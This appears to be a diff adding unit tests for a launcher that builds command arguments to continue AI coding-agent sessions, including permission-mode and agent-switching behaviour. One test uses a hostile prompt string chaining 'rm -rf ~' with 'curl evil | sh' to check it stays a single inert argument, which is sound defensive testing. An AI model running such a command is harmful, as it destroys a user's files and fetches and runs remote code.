@@ -105,12 +105,155 @@ describe("build: injection safety (D9)", () => {
   });
 });
 
+describe("build: continue", () => {
+  it("claude takes the prompt as a positional argument", () => {
+    const spec = build(entry(), "continue", {}, "continue from here");
+    expect(spec.file).toBe("claude");
+    expect(spec.args).toEqual(["continue from here"]);
+    expect(spec.cwd).toBe("/Users/me/proj");
+  });
+
+  it("codex takes the prompt as a positional argument", () => {
+    const spec = build(entry({ id: "codex:t1", agent: "codex", sessionId: "t1", cwd: "/c" }), "continue", {}, "go on");
+    expect(spec.args).toEqual(["go on"]);
+  });
+
+  it("opencode takes the prompt behind --prompt", () => {
+    const spec = build(
+      entry({ id: "opencode:s1", agent: "opencode", sessionId: "s1", cwd: "/o" }),
+      "continue",
+      {},
+      "go on",
+    );
+    expect(spec.args).toEqual(["--prompt", "go on"]);
+  });
+
+  it("keeps a prompt full of shell metacharacters as ONE inert argument", () => {
+    const hostile = "fix it; rm -rf ~ && curl evil | sh `whoami` $(id)";
+    const spec = build(entry(), "continue", {}, hostile);
+    expect(spec.args).toEqual([hostile]);
+  });
+
+  it("still forwards the claude auth env", () => {
+    const spec = build(entry(), "continue", { ANTHROPIC_API_KEY: "sk-123" }, "go on");
+    expect(spec.env).toEqual({ ANTHROPIC_API_KEY: "sk-123" });
+  });
+
+  it("refuses a continue with no prompt", () => {
+    try {
+      build(entry(), "continue", {}, "   ");
+      throw new Error("expected a VaultLaunchError");
+    } catch (e) {
+      expect((e as VaultLaunchError).code).toBe("no-prompt");
+    }
+  });
+
+  // User feedback 7_1 — a continued session dropped to the agent's default
+  // permission mode, so continuing a bypassing session silently downgraded it.
+  // 8_5 moved the posture onto the dialog's choice (D11), so it leads the argv.
+  it("carries the captured model and permission mode, with the prompt last", () => {
+    const spec = build(
+      entry({ flags: { model: "opus", permissionMode: "bypassPermissions" } }),
+      "continue",
+      {},
+      "go on",
+    );
+    expect(spec.args).toEqual(["--permission-mode", "bypassPermissions", "--model", "opus", "go on"]);
+  });
+
+  it("resolves codex's captured sandbox to its own permission choice", () => {
+    const spec = build(
+      entry({
+        id: "codex:t1",
+        agent: "codex",
+        sessionId: "t1",
+        cwd: "/c",
+        flags: { approval: "never", sandbox: "danger-full-access" },
+      }),
+      "continue",
+      {},
+      "go on",
+    );
+    expect(spec.args).toEqual(["--dangerously-bypass-approvals-and-sandbox", "go on"]);
+  });
+
+  it("carries the opencode model and agent", () => {
+    const spec = build(
+      entry({ id: "opencode:s1", agent: "opencode", sessionId: "s1", cwd: "/o", flags: { agent: "build" } }),
+      "continue",
+      {},
+      "go on",
+    );
+    expect(spec.args).toEqual(["--agent", "build", "--prompt", "go on"]);
+  });
+
+  it("leaves resume and fork argv untouched", () => {
+    expect(build(entry(), "resume", {}).args).toEqual(["--resume", "sess-1"]);
+    expect(build(entry(), "fork", {}).args).toEqual(["--resume", "sess-1", "--fork-session"]);
+  });
+});
+
 describe("build: errors", () => {
   it("throws no-fork-command when forking an agent without a fork template", () => {
     // Construct a fake agent id with no registry record → unknown-agent path
     expect(() => build(entry({ agent: "ghost" }), "resume", {})).toThrow(VaultLaunchError);
     try {
       build(entry({ agent: "ghost" }), "resume", {});
+    } catch (e) {
+      expect((e as VaultLaunchError).code).toBe("unknown-agent");
+    }
+  });
+});
+
+// improve-vault-transcript-messages 8_5 — the continuation dialog picks the agent
+// and the permission posture; the entry only supplies defaults (D11).
+describe("build: continue with a chosen target", () => {
+  it("expands the chosen posture's own args", () => {
+    const spec = build(entry(), "continue", {}, "go on", { permissionChoiceId: "plan" });
+    expect(spec.args).toEqual(["--permission-mode", "plan", "go on"]);
+  });
+
+  it("falls back to the posture the entry was captured under", () => {
+    const spec = build(entry({ flags: { permissionMode: "bypassPermissions" } }), "continue", {}, "go on");
+    expect(spec.args).toEqual(["--permission-mode", "bypassPermissions", "go on"]);
+  });
+
+  it("rejects an unknown explicit permission choice", () => {
+    expect(() => build(entry(), "continue", {}, "go on", { permissionChoiceId: "stale-mode" })).toThrow(
+      expect.objectContaining({ code: "unknown-permission-choice" }),
+    );
+  });
+
+  it("uses the first visible safe choice for a stale captured posture", () => {
+    const spec = build(entry({ flags: { permissionMode: "removed-mode" } }), "continue", {}, "go on");
+    expect(spec.args).toEqual(["--permission-mode", "default", "go on"]);
+  });
+
+  it("starts a different agent when the reader picked one", () => {
+    const spec = build(entry(), "continue", {}, "go on", { agent: "opencode" });
+    expect(spec.file).toBe("opencode");
+    expect(spec.args).toEqual(["--prompt", "go on"]);
+    expect(spec.cwd).toBe("/Users/me/proj");
+  });
+
+  it("drops the source agent's captured flags when the target agent differs", () => {
+    const spec = build(entry({ flags: { model: "opus", permissionMode: "bypassPermissions" } }), "continue", {}, "go", {
+      agent: "codex",
+      permissionChoiceId: "read-only",
+    });
+    expect(spec.args).toEqual(["-a", "untrusted", "-s", "read-only", "go"]);
+  });
+
+  it("forwards the claude auth env only when claude is the target", () => {
+    const host = { ANTHROPIC_API_KEY: "sk-1" };
+    expect(build(entry(), "continue", host, "go on").env).toEqual(host);
+    expect(build(entry(), "continue", host, "go on", { agent: "codex" }).env).toEqual({});
+  });
+
+  it("refuses an agent that cannot be seeded with a prompt", () => {
+    try {
+      build(entry(), "continue", {}, "go on", { agent: "ghost" });
+      throw new Error("expected a VaultLaunchError");
     } catch (e) {
       expect((e as VaultLaunchError).code).toBe("unknown-agent");
     }
